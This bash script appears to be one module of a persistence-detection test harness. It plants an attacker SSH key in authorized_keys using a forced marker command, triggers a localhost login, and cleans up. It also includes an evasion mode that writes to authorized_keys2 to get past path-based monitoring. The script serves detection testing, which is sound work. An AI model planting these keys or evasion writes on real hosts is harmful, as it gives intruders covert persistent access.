#!/usr/bin/env bash
# Implant 4 — SSH authorized_keys.
# Persistence: an extra keypair whose public half is appended to
# ~/.ssh/authorized_keys, letting the attacker log back in with the key.
# MITRE ATT&CK: T1098.004 (Account Manipulation: SSH Authorized Keys).
PD_TECH="ssh_key"
source "$(dirname "$(readlink -f "$0")")/lib.sh"

AUTH_KEYS="$HOME/.ssh/authorized_keys"
# A second, non-default authorized_keys-style file. OpenSSH only reads it if
# AuthorizedKeysFile is configured to include it, but a path-based watch that
# only covers the default file never sees this write.
EVADE_AUTH_KEYS="$HOME/.ssh/authorized_keys2"

PD_KEY_DIR="$PD_STATE_DIR/ssh_key"
PRIV_KEY="$PD_KEY_DIR/id_pd"
PUB_KEY="$PRIV_KEY.pub"

do_paths() { echo "$AUTH_KEYS"; }

_ensure_keypair() {
  mkdir -p "$PD_KEY_DIR"
  chmod 700 "$PD_KEY_DIR"
  if [ ! -f "$PRIV_KEY" ]; then
    ssh-keygen -t ed25519 -N '' -C "${PD_TAG}-${PD_TECH}" -f "$PRIV_KEY" >/dev/null
  fi
}

_authkeys_line() {
  # The command= restriction means logging in with this key runs the marker
  # payload instead of handing out a shell, which is enough to prove the key
  # gives the attacker code execution without actually opening a backdoor
  # shell on a shared VM.
  printf 'command="%s",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty %s' \
    "$(pd_payload_cmd)" "$(cat "$PUB_KEY")"
}

do_plant() {
  _ensure_keypair
  mkdir -p "$HOME/.ssh"; chmod 700 "$HOME/.ssh"
  pd_add_block "$AUTH_KEYS" "$(_authkeys_line)"
  chmod 600 "$AUTH_KEYS"
  pd_info "planted: key in $AUTH_KEYS lets attacker back in"
}

do_cleanup() {
  pd_remove_block "$AUTH_KEYS"
  pd_remove_block "$EVADE_AUTH_KEYS"
  pd_info "cleaned up"
}

# Real trigger: SSH in with the planted key. Requires sshd running locally
# and pubkey auth enabled (setup.sh does both). Falls back to running the
# payload directly if the local SSH round-trip can't complete (e.g. no sshd).
do_trigger() {
  _ensure_keypair
  if ssh -i "$PRIV_KEY" \
      -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      -o BatchMode=yes -o ConnectTimeout=5 -o LogLevel=ERROR \
      "$(id -un)@localhost" true 2>/dev/null; then
    pd_info "logged in with planted key (forced command ran server-side)"
  else
    pd_info "ssh round-trip failed (no local sshd?) — running payload directly"
    pd_trigger_default
  fi
}

# Evasion: plant into authorized_keys2 instead of the default file.
do_evade() {
  _ensure_keypair
  pd_add_block "$EVADE_AUTH_KEYS" "$(_authkeys_line)"
  chmod 600 "$EVADE_AUTH_KEYS"
  pd_info "evasion planted in $EVADE_AUTH_KEYS (not default authorized_keys)"
}

pd_main "$@"
